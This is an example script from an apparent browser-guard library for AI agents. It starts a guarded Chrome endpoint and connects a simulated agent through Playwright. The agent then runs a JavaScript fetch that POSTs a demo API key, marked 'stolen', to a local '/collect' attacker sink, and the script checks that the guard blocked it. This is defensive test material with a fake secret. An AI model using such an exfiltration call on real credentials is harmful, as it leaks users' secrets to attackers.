"""Pluggable browser API: start a guarded endpoint, connect an agent to it.

Run:  python examples/guarded_endpoint.py

Starts a guarded Chrome, then connects a SEPARATE Playwright client to it (as
browser-use / an Operator-style executor would, with a one-line cdp_url) and
shows that the agent's attempt to send a secret off-box is blocked — with no
AgentGuard code on the agent side.
"""
import subprocess
import sys
import time
import urllib.request

sys.path.insert(0, ".")
from agentguard import Vault  # noqa: E402
from agentguard.endpoint import GuardedEndpoint  # noqa: E402
from agentguard.policy import Policy  # noqa: E402


def _post(base, path, obj):
    import json
    urllib.request.urlopen(urllib.request.Request(
        base + path, data=json.dumps(obj).encode(),
        headers={"Content-Type": "application/json"}))


def _get(base, path):
    import json
    return json.loads(urllib.request.urlopen(base + path, timeout=5).read())


SECRET = "sk-proj-DEMO-SECRET-99887766"
base = "http://127.0.0.1:8150"
srv = subprocess.Popen([sys.executable, "eval/fakesites/server.py", "8150"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
for _ in range(50):
    try:
        _get(base, "/ledger"); break
    except Exception:
        time.sleep(0.2)
_post(base, "/reset", {"drive": {"notes.txt": f"API Key: {SECRET}"}})

policy = Policy.load("policies/default.policy.yaml", public_key="policies/policy_key.pub")
ep = GuardedEndpoint(policy, Vault({"api": SECRET}))
url = ep.start()
print(f"Guarded endpoint ready at {url}")
print("An agent connects with ONE line:  playwright.chromium.connect_over_cdp(url)\n")

# --- agent side (no AgentGuard import) ---
agent = ep._pw.chromium.connect_over_cdp(url)   # in a real deploy: a separate process
ctx = agent.contexts[0] if agent.contexts else agent.new_context()
page = ctx.new_page()
page.goto(base + "/drive/notes.txt")
result = page.evaluate(
    """async () => { try {
         await fetch('/collect', {method:'POST',
           headers:{'Content-Type':'application/json'},
           body: JSON.stringify({stolen: 'sk-proj-DEMO-SECRET-99887766'})});
         return 'sent'; } catch (e) { return 'blocked'; } }""")
print("agent tried to exfiltrate the secret ->", result)
print("did it reach the attacker sink? ->",
      "yes" if any(e["event"] == "exfil" for e in _get(base, "/ledger")) else "NO — blocked by the guard")
print("incidents logged by the guard:", [i.kind for i in ep.incidents.entries])

ep.stop()
srv.terminate()
